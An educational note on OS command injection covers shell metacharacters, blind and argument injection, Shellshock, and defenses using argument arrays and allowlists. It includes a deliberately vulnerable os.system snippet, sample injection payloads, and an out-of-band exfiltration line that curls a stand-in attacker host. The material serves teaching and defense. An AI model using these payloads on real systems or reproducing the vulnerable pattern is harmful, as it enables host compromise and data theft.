---
title: "OS Command Injection"
tags: ["security-basics", "command-injection", "web-security", "owasp"]
---

# OS Command Injection

**TL;DR** — Command injection happens when untrusted input reaches a system shell
and is parsed as part of the command line. It is part of A03:2021 Injection and
CWE-78, and it is often the worst-case web bug because it is a straight line to
code execution on the host. The fix is to stop invoking a shell at all: call the
program directly with an argument array, never a concatenated string.

## How it works

The app builds a shell command out of user input:

```python
# Vulnerable: input concatenated into a shell command
os.system("ping -c 1 " + host)
```

A shell interprets metacharacters, so supplying `host = example.com; id` runs two
commands:

```
ping -c 1 example.com; id
```

The separators that matter: `;` (sequence), `|` (pipe), `&`/`&&`/`||` (background
and logic), `$(...)` and backticks (command substitution), and newlines. Any one of
them turns a single intended command into attacker-chosen commands, running with the
web process's privileges.

The boundary that breaks is the same as SQL injection and XSS (see those notes):
data is parsed as code. Here the interpreter is `/bin/sh`, and the result is code
execution on the server.

## Blind command injection

Often there is no command output in the response. It is still fully exploitable:

- **Time-based** — `; sleep 10` and watch the response delay confirm execution.
- **Out-of-band** — `; curl http://attacker/$(whoami)` leaks data through a DNS or
  HTTP callback the attacker controls.

## Argument injection — the subtle cousin

Even with no shell, passing user input as an *argument* can be dangerous if it
starts with `-` and the program treats it as an option. Feeding `--output` or a
config flag to a tool like `curl`, `tar`, or `find` can write files or run
commands. Separate options from operands with `--`, and validate values.

## Where it actually shows up

Thin wrappers around command-line tools: ping/traceroute "network tools" pages,
image processing (ImageMagick, `ffmpeg`), PDF and document conversion, backup and
archive features, `git`/`svn` integrations, and anything that shells out to a
system binary. Home routers and IoT admin panels are notorious for it.

## Real-world impact

- **Shellshock (CVE-2014-6271, 2014)** — a flaw in how Bash parsed function
  definitions in environment variables. Any path that passed attacker-controlled
  data into a Bash environment variable — classically CGI scripts, where HTTP
  headers become env vars — allowed remote command execution. It was trivially
  wormable and widely exploited within days of disclosure.

Command-injection bugs in CGI endpoints and device firmware remain a steady source
of botnet recruitment for exactly this reason: one request, code execution, no
memory-corruption skill required.

## Defense

### Don't call a shell — the one that matters

Use an API that executes a program directly with an argument vector, so there is no
shell to interpret metacharacters:

```python
# Safe: no shell, arguments passed as a list
subprocess.run(["ping", "-c", "1", host], shell=False)
```

```java
// Safe: ProcessBuilder takes an argument list, not a command string
new ProcessBuilder("ping", "-c", "1", host).start();
```

The rule: never `shell=True`, never `os.system`, never string concatenation into a
command line. With an argument array, `example.com; id` is passed as one literal
argument to `ping`, which simply fails to resolve it — nothing executes.

### Better still, avoid the shell-out entirely

Prefer a native library over spawning a process (an HTTP client instead of `curl`,
an imaging library instead of shelling to a binary). The command you never run
cannot be injected.

### Defense in depth

- **Allowlist** the input when a value really must reach a command (e.g., a host
  must match a strict hostname/IP pattern). Allowlist, never blocklist
  metacharacters — blocklists always miss one.
- **Separate options from operands** with `--`, and never let input set flags.
- **Least privilege**: run the service as an unprivileged user, sandboxed
  (containers, seccomp, AppArmor/SELinux) so execution is contained.
- Keep interpreters and tools patched — Shellshock was a patch, not a design change.

## Checklist

1. Execute programs with an argument array; never spawn a shell on user input.
2. Prefer a native library over shelling out at all.
3. If a value must reach a command, allowlist its format strictly.
4. Separate options from operands with `--`; never let input become a flag.
5. Run least-privilege and sandboxed to contain any execution.
6. Patch interpreters and command-line tools.

## Takeaway

Command injection is the shortest path from a web bug to owning the host, and it is
almost entirely avoidable by construction: call the binary directly with an
argument list and there is no shell to subvert. Blocklisting metacharacters is a
losing game; removing the shell removes the vulnerability.

## References

- OWASP OS Command Injection Defense Cheat Sheet
- OWASP Top 10 — A03:2021 Injection
- MITRE CWE-78
- PortSwigger Web Security Academy — OS Command Injection
- NVD — CVE-2014-6271 (Shellshock)
